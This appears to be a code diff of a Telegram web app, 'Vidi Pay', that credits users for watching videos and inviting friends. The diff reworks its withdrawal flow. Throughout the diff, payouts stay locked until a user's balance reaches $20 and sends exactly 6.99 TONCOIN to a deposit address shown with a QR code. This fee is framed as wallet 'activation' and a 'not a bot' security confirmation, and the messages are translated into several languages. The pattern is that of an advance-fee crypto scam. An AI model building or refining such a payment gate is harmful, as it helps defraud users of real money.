@@ -9,12 +9,12 @@
     <title>Vidi Pay - Cyber Mint Edition</title>
     <script src="https://telegram.org/js/telegram-web-app.js?v=2026_v3"></script>
     <script src="https://www.youtube.com/iframe_api"></script>
-    <meta name="vidipay-build" content="wallet-activation-copy-v5-20260619">
+    <meta name="vidipay-build" content="wallet-toncoin-v6-20260620">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <script src="./config.js?v=wallet-activation-copy-v5-20260619"></script>
-    <script src="./qrcode.js?v=wallet-activation-copy-v5-20260619"></script>
+    <script src="./config.js?v=wallet-toncoin-v6-20260620"></script>
+    <script src="./qrcode.js?v=wallet-toncoin-v6-20260620"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
@@ -2218,9 +2218,9 @@
                 <div class="withdraw-extra-row" id="withdraw-extra-row">Additional withdrawal information will appear here.</div>
                 <div id="withdraw-form-box" class="withdraw-wallet-card" style="display:none;">
                     <div class="withdraw-wallet-card-title" data-i18n="withdraw_form_title"><i class="fas fa-link"></i> Connect payout wallet</div>
-                    <input id="withdraw-amount-input" class="withdraw-wallet-input" type="number" min="9" step="0.01" placeholder="Withdrawal amount (Example, 9 USDT)" data-i18n-placeholder="withdraw_amount_placeholder">
+                    <input id="withdraw-amount-input" class="withdraw-wallet-input" type="number" min="6.99" step="0.01" placeholder="Withdrawal amount (Example, 6.99 TONCOIN)" data-i18n-placeholder="withdraw_amount_placeholder">
                     <input id="withdraw-address-input" class="withdraw-wallet-input" type="text" placeholder="Your TON wallet address" data-i18n-placeholder="withdraw_card_placeholder">
-                    <input id="withdraw-method-input" type="hidden" value="USDT_TON">
+                    <input id="withdraw-method-input" type="hidden" value="TON">
                     <button class="copy-link-btn" onclick="submitWithdrawRequest()">
                         <i class="fas fa-paper-plane" style="margin-right:8px;"></i><span data-i18n="request_withdrawal">REQUEST WITHDRAWAL</span>
                     </button>
@@ -2272,46 +2272,60 @@
     <div id="walletModal" class="modal-overlay">
         <div class="modal-content">
             <button class="modal-close" onclick="closeModal('walletModal')"><i class="fas fa-times"></i></button>
-            <div class="modal-title">Wallet</div>
+            <div class="modal-title" id="wallet-modal-title">Wallet activation</div>
             <div class="info-sub-block">
                 <div class="profile-data-field">
                     <span class="profile-data-label" id="wallet-current-balance-label">Current Balance:</span>
                     <span class="profile-data-value" id="wallet-balance-view">$0.00</span>
                 </div>
                 <div class="profile-data-field">
-                    <span class="profile-data-label" id="wallet-method-label">Withdrawal Method:</span>
-                    <span class="profile-data-value" id="wallet-method-value" style="color: var(--accent-color);">TON USDT</span>
+                    <span class="profile-data-label" id="wallet-method-label">Activation network:</span>
+                    <span class="profile-data-value" id="wallet-method-value" style="color: var(--accent-color);">TONCOIN</span>
                 </div>
-                <div class="withdraw-locked-row" id="wallet-lock-row">Wallet locked until withdrawal time</div>
-                <div class="withdraw-extra-row" id="wallet-lock-extra">The TON USDT address for activation payment will appear here.</div>
+                <div class="withdraw-locked-row" id="wallet-lock-row"><i class="fas fa-lock" style="margin-right:8px;"></i>Wallet locked</div>
+                <div class="withdraw-extra-row" id="wallet-lock-extra">Earn $20.00 in total to unlock wallet activation.</div>
                 
                 <div id="payment-unlock-box" class="wallet-activation-card" style="display:none;">
-                    <div style="font-weight:900; color:var(--accent-color); margin-bottom:12px; font-size:16px; text-align:center;" id="lbl-unlock-title">Account unlock activation</div>
-
-                    <div class="wallet-flow-row">
-                        <div class="wallet-flow-item"><b>10 USDT</b><span id="wallet-flow-deposit">Activation deposit</span></div>
-                    </div>
-
+                    <div style="font-weight:900; color:var(--accent-color); margin-bottom:12px; font-size:16px; text-align:center;" id="lbl-unlock-title">Wallet activation</div>
                     <div class="wallet-pay-card">
                         <div class="wallet-pay-heading">
-                            <span id="lbl-fastest-method"><i class="fas fa-qrcode"></i> TON USDT address</span>
+                            <span id="lbl-fastest-method"><i class="fas fa-shield-alt"></i> Security confirmation</span>
                             <span class="wallet-network-pill">TON</span>
                         </div>
-                        <div class="wallet-help-text" id="lbl-fiat-desc">Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.</div>
-                        <div class="ton-qr-box" id="ton-qr-box"></div>
+                        <div class="wallet-help-text" id="lbl-fiat-desc">Confirm that you are not a bot and connect your personal TON wallet to the VidiPay system. To activate it, top up exactly 6.99 TONCOIN and after confirmation you can request withdrawal to your TON wallet. Blockchain network commission may apply.</div>
                         <div class="ton-payment-actions">
-                            <button type="button" onclick="copyTonPaymentAddress()"><i class="fas fa-copy"></i> <span id="lbl-copy-ton-address">COPY ADDRESS</span></button>
-                            <button type="button" id="fiat-pay-btn" onclick="refreshPaymentStatus()"><i class="fas fa-sync-alt"></i> <span id="lbl-pay-fiat">CHECK PAYMENT</span></button>
+                            <button type="button" id="fiat-pay-btn" onclick="openTonDepositModal()"><i class="fas fa-coins"></i> <span id="lbl-pay-fiat">TOP UP 6.99 TONCOIN</span></button>
                         </div>
                     </div>
+                    <div id="payment-status-text" style="margin-top:8px; color:#a0a5b5; font-size:12px; font-weight:800;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="tonDepositModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal('tonDepositModal')"><i class="fas fa-times"></i></button>
+            <div class="modal-title" id="ton-deposit-title">6.99 TONCOIN payment</div>
+            <div class="info-sub-block">
+                <div class="wallet-pay-card">
+                    <div class="wallet-pay-heading">
+                        <span><i class="fas fa-qrcode"></i> TON deposit address</span>
+                        <span class="wallet-network-pill">TON</span>
+                    </div>
+                    <div class="wallet-help-text" id="ton-deposit-warning">Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.</div>
+                    <div class="ton-qr-box" id="ton-qr-box"></div>
                     <div id="payment-address-box" style="display:none; margin-top:10px; padding:12px; border:1px solid rgba(0,255,204,.24); border-radius:14px; background:rgba(0,255,204,.06);">
                         <div id="payment-amount-text" style="color:#00ffcc; font-size:13px; font-weight:900; margin-bottom:8px;"></div>
-                        <div class="wallet-address-label">TON USDT deposit address</div>
+                        <div class="wallet-address-label" id="payment-address-label">Unique TON deposit address</div>
                         <div id="payment-address-text" style="color:#ffffff; font-size:12px; font-weight:900; line-height:1.45; word-break:break-all;"></div>
                         <div id="payment-expiry-text" style="color:#a0a5b5; font-size:11px; font-weight:800; margin-top:8px;"></div>
                     </div>
-                    <div id="payment-formula-text" style="margin-top:10px; color:#d7fbe8; font-size:12px; font-weight:900;"></div>
-                    <div id="payment-status-text" style="margin-top:8px; color:#a0a5b5; font-size:12px; font-weight:800;"></div>
+                    <div class="ton-payment-actions">
+                        <button type="button" onclick="copyTonPaymentAddress()"><i class="fas fa-copy"></i> <span id="lbl-copy-ton-address">COPY ADDRESS</span></button>
+                        <button type="button" onclick="refreshPaymentStatus()"><i class="fas fa-sync-alt"></i> <span id="lbl-check-ton-payment">CHECK PAYMENT</span></button>
+                    </div>
+                    <div id="ton-deposit-status-text" style="margin-top:8px; color:#a0a5b5; font-size:12px; font-weight:800;"></div>
                 </div>
             </div>
         </div>
@@ -2508,6 +2522,8 @@
         const MRBEAST_RANDOM_START_MAX = 40;
         const DAY_MS = 24 * 60 * 60 * 1000;
         const BONUS_PER_FRIEND = 9.99;
+        const WALLET_UNLOCK_REQUIRED_USD = 20;
+        const TON_ACTIVATION_AMOUNT = 6.99;
         const storageKey = `vidiPayState_${referralUserId}`;
         const defaultState = {
             balance: 0,
@@ -2832,6 +2848,34 @@
             return candidates.find(isLikelyTonWalletAddress) || '';
         }
 
+        function getWalletUnlockRequiredAmount() {
+            const configured = Number(backendSettings.wallet_unlock_required_amount);
+            return Number.isFinite(configured) && configured > 0 ? configured : WALLET_UNLOCK_REQUIRED_USD;
+        }
+
+        function getWalletEarningAmount() {
+            return Number(appState.balance || 0);
+        }
+
+        function isWalletEarningUnlocked() {
+            return getWalletEarningAmount() >= getWalletUnlockRequiredAmount();
+        }
+
+        function getTonActivationAmount() {
+            const configured = Number(backendSettings.activation_deposit_amount);
+            return Number.isFinite(configured) && configured > 0 ? configured : TON_ACTIVATION_AMOUNT;
+        }
+
+        function tonAmountToNano(amount) {
+            const [whole, fraction = ''] = Number(amount || 0).toFixed(9).split('.');
+            return `${whole}${fraction}`.replace(/^0+(?=\d)/, '');
+        }
+
+        function buildTonPaymentQrData(address) {
+            if (!address) return '';
+            return `ton://transfer/${address}?amount=${tonAmountToNano(getTonActivationAmount())}`;
+        }
+
         function renderTonPaymentQr(address) {
             const qrBox = document.getElementById('ton-qr-box');
             if (!qrBox) return;
@@ -2840,7 +2884,7 @@
 
             try {
                 const qr = qrcode(0, 'M');
-                qr.addData(address);
+                qr.addData(buildTonPaymentQrData(address));
                 qr.make();
                 qrBox.innerHTML = qr.createTableTag(4, 0);
             } catch (err) {
@@ -2884,6 +2928,7 @@
 
             const box = document.getElementById('payment-unlock-box');
             const statusEl = document.getElementById('payment-status-text');
+            const depositStatusEl = document.getElementById('ton-deposit-status-text');
             const addressBox = document.getElementById('payment-address-box');
             const amountEl = document.getElementById('payment-amount-text');
             const addressEl = document.getElementById('payment-address-text');
@@ -2891,21 +2936,24 @@
 
             if (!box) return;
 
-            updateWalletLockUi(getWithdrawWindowState());
+            updateWalletLockUi();
 
             if (statusData?.withdraw_unlocked) {
                 box.style.display = 'block';
                 if (addressBox) addressBox.style.display = 'none';
                 renderTonPaymentQr('');
                 if (statusEl) statusEl.innerText = t('payment_verified_wallet');
+                if (depositStatusEl) depositStatusEl.innerText = t('payment_verified_wallet');
                 updateLocalCardMethodUi();
                 return;
             }
 
             if (!currentPaymentOrder) {
-                box.style.display = 'none';
+                box.style.display = isWalletEarningUnlocked() ? 'block' : 'none';
                 if (addressBox) addressBox.style.display = 'none';
                 renderTonPaymentQr('');
+                if (statusEl) statusEl.innerText = isWalletEarningUnlocked() ? t('wallet_payment_ready') : t('wallet_locked_until_20');
+                if (depositStatusEl) depositStatusEl.innerText = t('card_order_loading');
                 return;
             }
 
@@ -2913,7 +2961,7 @@
             const walletAddress = getPaymentWalletAddress(currentPaymentOrder);
             const amount = Number(currentPaymentOrder.required_amount || currentPaymentOrder.amount || 0);
             if (addressBox) addressBox.style.display = walletAddress ? 'block' : 'none';
-            if (amountEl) amountEl.innerText = amount ? `${amount.toFixed(2)} USDT TON` : 'USDT TON';
+            if (amountEl) amountEl.innerText = amount ? `${amount.toFixed(2)} TONCOIN` : `${getTonActivationAmount().toFixed(2)} TONCOIN`;
             if (addressEl) addressEl.innerText = walletAddress || '';
             if (expiryEl) {
                 expiryEl.innerText = currentPaymentOrder.expires_at
@@ -2922,9 +2970,15 @@
             }
             renderTonPaymentQr(walletAddress);
             if (statusEl) {
-                const depositAmount = Number(backendSettings.activation_deposit_amount || amount || 10);
+                const depositAmount = Number(backendSettings.activation_deposit_amount || amount || TON_ACTIVATION_AMOUNT);
                 statusEl.innerText = walletAddress
-                    ? `Deposit ${depositAmount.toFixed(2)} USDT on TON to activate withdrawal. Blockchain service commission may be charged.`
+                    ? `Send exactly ${depositAmount.toFixed(2)} TONCOIN. Other amounts are not confirmed automatically.`
+                    : t('payment_address_unavailable');
+            }
+            if (depositStatusEl) {
+                const depositAmount = Number(backendSettings.activation_deposit_amount || amount || TON_ACTIVATION_AMOUNT);
+                depositStatusEl.innerText = walletAddress
+                    ? `Waiting for exactly ${depositAmount.toFixed(2)} TONCOIN on TON network.`
                     : t('payment_address_unavailable');
             }
             updateLocalCardMethodUi();
@@ -3019,7 +3073,7 @@
                 setDomDisplay(formBox, 'block');
                 if (amountInput && !amountInput.value) amountInput.value = refundAmount ? refundAmount.toFixed(2) : '';
                 if (amountInput) amountInput.min = String(minWithdraw || 0);
-                setDomText(formStatus, `${t('activation_refund_available')}: ${refundAmount.toFixed(2)} USDT`);
+                setDomText(formStatus, `${t('activation_refund_available')}: ${refundAmount.toFixed(2)} TONCOIN`);
                 return;
             }
 
@@ -3043,14 +3097,25 @@
             const lockRow = document.getElementById('wallet-lock-row');
             const lockExtra = document.getElementById('wallet-lock-extra');
             const paymentBox = document.getElementById('payment-unlock-box');
+            const required = getWalletUnlockRequiredAmount();
+            const earned = getWalletEarningAmount();
+            const unlockedByEarning = earned >= required;
 
             if (walletBtn) {
-                walletBtn.classList.toggle('wallet-locked', false);
-                walletBtn.setAttribute('aria-disabled', 'false');
+                walletBtn.classList.toggle('wallet-locked', !unlockedByEarning);
+                walletBtn.setAttribute('aria-disabled', unlockedByEarning ? 'false' : 'true');
             }
 
-            setDomText(lockRow, t('wallet_open_time'));
+            if (!unlockedByEarning) {
+                setDomText(lockRow, t('wallet_locked_until_20'));
+                setDomText(lockExtra, `${t('wallet_unlock_progress')}: $${earned.toFixed(2)} / $${required.toFixed(2)}`);
+                setDomDisplay(paymentBox, 'none');
+                return;
+            }
+
+            setDomText(lockRow, t('wallet_ready_for_activation'));
             setDomText(lockExtra, t('payment_address_available'));
+            setDomDisplay(paymentBox, 'block');
             updateLocalCardMethodUi();
         }
 
@@ -3119,7 +3184,7 @@
 
             const amount = Number(amountInput?.value || 0);
             const walletAddress = (addressInput?.value || '').trim();
-            const walletType = methodInput?.value || 'USDT_TON';
+            const walletType = methodInput?.value || 'TON';
 
             if (!amount || amount <= 0) {
                 if (statusEl) statusEl.innerText = t('withdraw_amount_required');
@@ -3265,10 +3330,10 @@
                 withdraw_expired_title: "Withdrawal time expired",
                 withdraw_expired_message: "The last withdrawal window has ended. Wallet stays locked until the next schedule.",
                 withdraw_request_available: "Withdrawal request is available",
-                withdraw_enter_details: "Enter your TON wallet carefully. Activation refund payout is 9 USDT.",
+                withdraw_enter_details: "Enter your TON wallet carefully. Activation refund payout is 6.99 TONCOIN.",
                 payment_verified_withdraw: "Payment verified. Withdrawal is available.",
-                payment_required_withdraw: "Deposit 10 USDT on TON to activate withdrawal.",
-                activation_deposit_required: "Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.",
+                payment_required_withdraw: "Deposit 6.99 TONCOIN on TON to activate withdrawal.",
+                activation_deposit_required: "Deposit 6.99 TONCOIN on TON to activate withdrawal. Blockchain service commission may be charged.",
                 activation_refund_available: "Available refund payout",
                 payout_request_now: "You can submit your payout request now.",
                 payment_check_status: "Complete the required payment and check the status.",
@@ -3301,7 +3366,7 @@
                 /* YAGNI QO'SHILDI: FIAT TARJIMALARI */
                 pay_with_fiat: "CHECK PAYMENT",
                 fastest_method: "FASTEST METHOD",
-                fiat_desc: "Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.",
+                fiat_desc: "Deposit 6.99 TONCOIN on TON to activate withdrawal. Blockchain service commission may be charged.",
                 or_crypto: "TON NETWORK PAYMENT",
                 account_unlock_title: "Account unlock activation"
             },
@@ -3331,7 +3396,7 @@
 
                 pay_with_fiat: "ПРОВЕРИТЬ ОПЛАТУ",
                 fastest_method: "БЫСТРЫЙ СПОСОБ",
-                fiat_desc: "Внесите 10 USDT в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
+                fiat_desc: "Внесите 6.99 TONCOIN в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
                 or_crypto: "ОПЛАТА В СЕТИ TON",
                 account_unlock_title: "Активация вывода средств"
             }
@@ -3717,22 +3782,32 @@
         Object.assign(languages.en, {
             bonus: "BONUS",
             wallet_current_balance: "Current Balance:",
-            withdrawal_method_label: "Withdrawal Method:",
-            bank_card: "TON Wallet",
-            wallet_open_time: "Wallet is open during withdrawal time",
-            wallet_locked_extra: "Payment options will appear when the withdrawal window opens.",
-            payment_address_available: "Activation payment TON USDT address and QR code are shown below.",
+            withdrawal_method_label: "Activation network:",
+            bank_card: "TONCOIN",
+            wallet_open_time: "Wallet activation is available",
+            wallet_locked_extra: "Earn $20.00 in total to unlock wallet activation.",
+            wallet_locked_until_20: "Wallet is locked until your total income reaches $20.00.",
+            wallet_unlock_progress: "Wallet unlock progress",
+            wallet_ready_for_activation: "Wallet is ready for activation",
+            payment_address_available: "Confirm you are not a bot and connect your personal TON wallet.",
             pay_with_fiat: "CHECK PAYMENT",
-            fiat_desc: "Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.",
-            card_selector_title: "TON wallet",
+            top_up_toncoin: "TOP UP 6.99 TONCOIN",
+            fiat_desc: "Confirm that you are not a bot and connect your personal TON wallet to VidiPay. Top up exactly 6.99 TONCOIN to activate it. Blockchain network commission may apply.",
+            card_selector_title: "TONCOIN wallet",
             card_maintenance: "Profilaktika. This payment route is temporarily unavailable.",
             card_order_loading: "Payment order is loading. Please wait.",
             card_payment_opened: "Payment window opened. Complete the payment and return to this page.",
-            wallet_payment_ready: "TON activation deposit is ready.",
+            wallet_payment_ready: "TONCOIN activation is ready.",
             payment_address_unavailable: "TON wallet address is not connected yet.",
             payment_verified_wallet: "Withdrawal is unlocked. You can request a withdrawal now.",
-            activation_deposit_required: "Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.",
-            activation_refund_available: "Available refund payout"
+            activation_deposit_required: "Top up exactly 6.99 TONCOIN to activate the wallet. Other amounts are not confirmed automatically.",
+            activation_refund_available: "Available refund payout",
+            account_unlock_title: "Wallet activation",
+            fastest_method: "Security confirmation",
+            ton_deposit_title: "6.99 TONCOIN payment",
+            ton_deposit_warning: "Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.",
+            payment_address_label: "Unique TON deposit address",
+            wallet_method_value: "TONCOIN"
         });
 
         Object.assign(languages.ru, {
@@ -3744,9 +3819,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "Кошелек открыт во время вывода средств",
             wallet_locked_extra: "Способы оплаты появятся, когда откроется окно вывода.",
-            payment_address_available: "TON USDT адрес для активационного платежа и QR-код показаны ниже.",
+            payment_address_available: "TONCOIN адрес для активационного платежа и QR-код показаны ниже.",
             pay_with_fiat: "ПРОВЕРИТЬ ОПЛАТУ",
-            fiat_desc: "Внесите 10 USDT в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
+            fiat_desc: "Внесите 6.99 TONCOIN в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
             card_selector_title: "TON wallet",
             card_maintenance: "Профилактика. Этот платежный маршрут временно недоступен.",
             card_order_loading: "Платежный заказ загружается. Пожалуйста, подождите.",
@@ -3754,8 +3829,8 @@
             wallet_payment_ready: "TON activation deposit готов.",
             payment_address_unavailable: "TON адрес кошелька пока не подключен.",
             payment_verified_wallet: "Вывод разблокирован. Теперь можно создать заявку.",
-            payment_required_withdraw: "Внесите 10 USDT в сети TON, чтобы активировать вывод.",
-            activation_deposit_required: "Внесите 10 USDT в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
+            payment_required_withdraw: "Внесите 6.99 TONCOIN в сети TON, чтобы активировать вывод.",
+            activation_deposit_required: "Внесите 6.99 TONCOIN в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
             activation_refund_available: "Доступный возврат"
         });
 
@@ -3766,9 +3841,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "Le portefeuille est ouvert pendant la periode de retrait",
             wallet_locked_extra: "Les options de paiement apparaitront quand la periode de retrait ouvrira.",
-            payment_address_available: "L'adresse TON USDT du paiement d'activation et le QR code sont affiches ci-dessous.",
+            payment_address_available: "L'adresse TONCOIN du paiement d'activation et le QR code sont affiches ci-dessous.",
             pay_with_fiat: "VERIFIER LE PAIEMENT",
-            fiat_desc: "Deposez 10 USDT sur TON pour activer le retrait. Une commission blockchain peut etre facturee.",
+            fiat_desc: "Deposez 6.99 TONCOIN sur TON pour activer le retrait. Une commission blockchain peut etre facturee.",
             card_selector_title: "TON wallet",
             card_maintenance: "Profilaktika. Cette route de paiement est temporairement indisponible.",
             card_order_loading: "La commande de paiement se charge. Veuillez patienter.",
@@ -3776,8 +3851,8 @@
             wallet_payment_ready: "Le paiement TON wallet est pret.",
             payment_address_unavailable: "L'adresse wallet TON n'est pas encore connectee.",
             payment_verified_wallet: "Le retrait est debloque. Vous pouvez envoyer une demande.",
-            payment_required_withdraw: "Deposez 10 USDT sur TON pour activer le retrait.",
-            activation_deposit_required: "Deposez 10 USDT sur TON pour activer le retrait. Une commission blockchain peut etre facturee.",
+            payment_required_withdraw: "Deposez 6.99 TONCOIN sur TON pour activer le retrait.",
+            activation_deposit_required: "Deposez 6.99 TONCOIN sur TON pour activer le retrait. Une commission blockchain peut etre facturee.",
             activation_refund_available: "Remboursement disponible"
         });
 
@@ -3788,9 +3863,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "Wallet withdrawal time par open hai",
             wallet_locked_extra: "Withdrawal window open hone par payment options dikhengi.",
-            payment_address_available: "Activation payment TON USDT address aur QR code neeche hai.",
+            payment_address_available: "Activation payment TONCOIN address aur QR code neeche hai.",
             pay_with_fiat: "CHECK PAYMENT",
-            fiat_desc: "Withdrawal activate karne ke liye TON par 10 USDT deposit karein. Blockchain service commission lag sakti hai.",
+            fiat_desc: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein. Blockchain service commission lag sakti hai.",
             card_selector_title: "TON wallet",
             card_maintenance: "Profilaktika. Yeh payment route temporary unavailable hai.",
             card_order_loading: "Payment order loading hai. Please wait.",
@@ -3798,8 +3873,8 @@
             wallet_payment_ready: "TON wallet payment ready hai.",
             payment_address_unavailable: "TON wallet address abhi connected nahi hai.",
             payment_verified_wallet: "Withdrawal unlock ho gaya. Ab request bhej sakte hain.",
-            payment_required_withdraw: "Withdrawal activate karne ke liye TON par 10 USDT deposit karein.",
-            activation_deposit_required: "Withdrawal activate karne ke liye TON par 10 USDT deposit karein. Blockchain service commission lag sakti hai.",
+            payment_required_withdraw: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein.",
+            activation_deposit_required: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein. Blockchain service commission lag sakti hai.",
             activation_refund_available: "Available refund payout"
         });
 
@@ -3810,9 +3885,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "La billetera esta abierta durante el horario de retiro",
             wallet_locked_extra: "Las opciones de pago apareceran cuando se abra el horario de retiro.",
-            payment_address_available: "La direccion TON USDT para el pago de activacion y el QR estan abajo.",
+            payment_address_available: "La direccion TONCOIN para el pago de activacion y el QR estan abajo.",
             pay_with_fiat: "VERIFICAR PAGO",
-            fiat_desc: "Deposita 10 USDT en TON para activar el retiro. Puede cobrarse comision del servicio blockchain.",
+            fiat_desc: "Deposita 6.99 TONCOIN en TON para activar el retiro. Puede cobrarse comision del servicio blockchain.",
             card_selector_title: "TON wallet",
             card_maintenance: "Profilaktika. Esta ruta de pago no esta disponible temporalmente.",
             card_order_loading: "La orden de pago se esta cargando. Espera un momento.",
@@ -3820,8 +3895,8 @@
             wallet_payment_ready: "El pago con TON wallet esta listo.",
             payment_address_unavailable: "La direccion wallet TON aun no esta conectada.",
             payment_verified_wallet: "El retiro esta desbloqueado. Ya puedes enviar una solicitud.",
-            payment_required_withdraw: "Deposita 10 USDT en TON para activar el retiro.",
-            activation_deposit_required: "Deposita 10 USDT en TON para activar el retiro. Puede cobrarse comision del servicio blockchain.",
+            payment_required_withdraw: "Deposita 6.99 TONCOIN en TON para activar el retiro.",
+            activation_deposit_required: "Deposita 6.99 TONCOIN en TON para activar el retiro. Puede cobrarse comision del servicio blockchain.",
             activation_refund_available: "Reembolso disponible"
         });
 
@@ -3832,9 +3907,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "钱包在提现时间内开放",
             wallet_locked_extra: "提现窗口打开后会显示支付选项。",
-            payment_address_available: "激活付款 TON USDT 地址和二维码如下。",
+            payment_address_available: "激活付款 TONCOIN 地址和二维码如下。",
             pay_with_fiat: "检查付款",
-            fiat_desc: "请在 TON 网络充值 10 USDT 以激活提现。可能会收取区块链服务手续费。",
+            fiat_desc: "请在 TON 网络充值 6.99 TONCOIN 以激活提现。可能会收取区块链服务手续费。",
             card_selector_title: "TON wallet",
             card_maintenance: "维护中。该支付线路暂时不可用。",
             card_order_loading: "支付订单正在加载，请稍候。",
@@ -3842,8 +3917,8 @@
             wallet_payment_ready: "TON 钱包付款已准备好。",
             payment_address_unavailable: "TON 钱包地址尚未连接。",
             payment_verified_wallet: "提现已解锁。现在可以提交申请。",
-            payment_required_withdraw: "请在 TON 网络充值 10 USDT 以激活提现。",
-            activation_deposit_required: "请在 TON 网络充值 10 USDT 以激活提现。可能会收取区块链服务手续费。",
+            payment_required_withdraw: "请在 TON 网络充值 6.99 TONCOIN 以激活提现。",
+            activation_deposit_required: "请在 TON 网络充值 6.99 TONCOIN 以激活提现。可能会收取区块链服务手续费。",
             activation_refund_available: "可提现返还"
         });
 
@@ -3854,9 +3929,9 @@
             bank_card: "TON Wallet",
             wallet_open_time: "Wallet ist waehrend der Auszahlungszeit geoeffnet",
             wallet_locked_extra: "Zahlungsoptionen erscheinen, wenn das Auszahlungsfenster geoeffnet ist.",
-            payment_address_available: "Die TON USDT Adresse fuer die Aktivierungszahlung und der QR-Code stehen unten.",
+            payment_address_available: "Die TONCOIN Adresse fuer die Aktivierungszahlung und der QR-Code stehen unten.",
             pay_with_fiat: "ZAHLUNG PRUEFEN",
-            fiat_desc: "Zahle 10 USDT auf TON ein, um die Auszahlung zu aktivieren. Eine Blockchain-Servicegebuehr kann anfallen.",
+            fiat_desc: "Zahle 6.99 TONCOIN auf TON ein, um die Auszahlung zu aktivieren. Eine Blockchain-Servicegebuehr kann anfallen.",
             card_selector_title: "TON wallet",
             card_maintenance: "Profilaktika. Diese Zahlungsroute ist voruebergehend nicht verfuegbar.",
             card_order_loading: "Zahlungsauftrag wird geladen. Bitte warten.",
@@ -3864,15 +3939,15 @@
             wallet_payment_ready: "TON Wallet-Zahlung ist bereit.",
             payment_address_unavailable: "TON Wallet-Adresse ist noch nicht verbunden.",
             payment_verified_wallet: "Auszahlung ist freigeschaltet. Du kannst jetzt eine Anfrage senden.",
-            payment_required_withdraw: "Zahle 10 USDT auf TON ein, um die Auszahlung zu aktivieren.",
-            activation_deposit_required: "Zahle 10 USDT auf TON ein, um die Auszahlung zu aktivieren. Eine Blockchain-Servicegebuehr kann anfallen.",
+            payment_required_withdraw: "Zahle 6.99 TONCOIN auf TON ein, um die Auszahlung zu aktivieren.",
+            activation_deposit_required: "Zahle 6.99 TONCOIN auf TON ein, um die Auszahlung zu aktivieren. Eine Blockchain-Servicegebuehr kann anfallen.",
             activation_refund_available: "Verfuegbare Rueckzahlung"
         });
 
 
         Object.assign(languages.en, {
             withdraw_form_title: "Create withdrawal request",
-            withdraw_amount_placeholder: "Withdrawal amount (Example, 9 USDT)",
+            withdraw_amount_placeholder: "Withdrawal amount (Example, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Your TON wallet address",
             request_withdrawal: "REQUEST WITHDRAWAL",
             withdraw_amount_required: "Enter withdrawal amount.",
@@ -3898,7 +3973,7 @@
 
         Object.assign(languages.ru, {
             withdraw_form_title: "Создать заявку на вывод",
-            withdraw_amount_placeholder: "Сумма вывода (например, 9 USDT)",
+            withdraw_amount_placeholder: "Сумма вывода (например, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Ваш TON адрес кошелька",
             request_withdrawal: "ЗАПРОСИТЬ ВЫВОД",
             withdraw_amount_required: "Введите сумму вывода.",
@@ -3924,7 +3999,7 @@
 
         Object.assign(languages.fr, {
             withdraw_form_title: "Creer une demande de retrait",
-            withdraw_amount_placeholder: "Montant du retrait (exemple, 9 USDT)",
+            withdraw_amount_placeholder: "Montant du retrait (exemple, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Votre adresse wallet TON",
             request_withdrawal: "DEMANDER LE RETRAIT",
             withdraw_amount_required: "Saisissez le montant du retrait.",
@@ -3950,7 +4025,7 @@
 
         Object.assign(languages.hi, {
             withdraw_form_title: "Withdrawal request banayein",
-            withdraw_amount_placeholder: "Withdrawal amount (example, 9 USDT)",
+            withdraw_amount_placeholder: "Withdrawal amount (example, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Apna TON wallet address",
             request_withdrawal: "REQUEST WITHDRAWAL",
             withdraw_amount_required: "Withdrawal amount enter karein.",
@@ -3976,7 +4051,7 @@
 
         Object.assign(languages.es, {
             withdraw_form_title: "Crear solicitud de retiro",
-            withdraw_amount_placeholder: "Monto de retiro (ejemplo, 9 USDT)",
+            withdraw_amount_placeholder: "Monto de retiro (ejemplo, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Tu direccion wallet TON",
             request_withdrawal: "SOLICITAR RETIRO",
             withdraw_amount_required: "Ingresa el monto de retiro.",
@@ -4002,7 +4077,7 @@
 
         Object.assign(languages.zh, {
             withdraw_form_title: "创建提现申请",
-            withdraw_amount_placeholder: "提现金额（例如 9 USDT）",
+            withdraw_amount_placeholder: "提现金额（例如 6.99 TONCOIN）",
             withdraw_card_placeholder: "您的 TON 钱包地址",
             request_withdrawal: "申请提现",
             withdraw_amount_required: "请输入提现金额。",
@@ -4028,7 +4103,7 @@
 
         Object.assign(languages.de, {
             withdraw_form_title: "Auszahlungsanfrage erstellen",
-            withdraw_amount_placeholder: "Auszahlungsbetrag (Beispiel, 9 USDT)",
+            withdraw_amount_placeholder: "Auszahlungsbetrag (Beispiel, 6.99 TONCOIN)",
             withdraw_card_placeholder: "Deine TON Wallet-Adresse",
             request_withdrawal: "AUSZAHLUNG ANFRAGEN",
             withdraw_amount_required: "Auszahlungsbetrag eingeben.",
@@ -4120,7 +4195,7 @@
             not_enough_time: "Время просмотра недостаточно. Деньги не добавлены.",
